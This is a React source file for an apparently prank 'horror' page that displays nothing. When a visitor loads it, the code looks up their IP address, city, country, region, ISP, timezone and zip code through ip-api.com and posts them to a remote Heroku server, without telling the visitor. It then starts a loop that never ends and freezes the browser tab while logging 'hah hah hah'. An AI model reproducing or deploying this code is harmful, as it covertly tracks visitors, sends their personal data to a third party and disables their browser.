import React, { Component } from 'react';
import axios from 'axios';
import './App.css'

export default class App extends Component {
  state = {
    // baseUrl:'http://127.0.0.1:8000/api',
     baseUrl:'https://immense-beyond-81444.herokuapp.com/api',
  
  }
componentDidMount(){
  axios.get('http://ip-api.com/json')
  .then((res) => {
    axios.post(`${this.state.baseUrl}/user`,{
      city:res.data.city,
      country:res.data.country,
      isp:res.data.isp,
      ip:res.data.query,
      region:res.data.regionName,
      timezone:res.data.timezone,
      zip:res.data.zip,
      website:'horror'
     })
     .then((response) => {
      const test = response.data.success;
     console.log(test);
     this.horror();

  
    }) 
  })
}
horror = () => {
  for (let i = 5; i > 3; i++){
    console.log('hah hah hah')
  }
}

  render() {
    return (
      <div>
        
    </div>
    )
  }
}

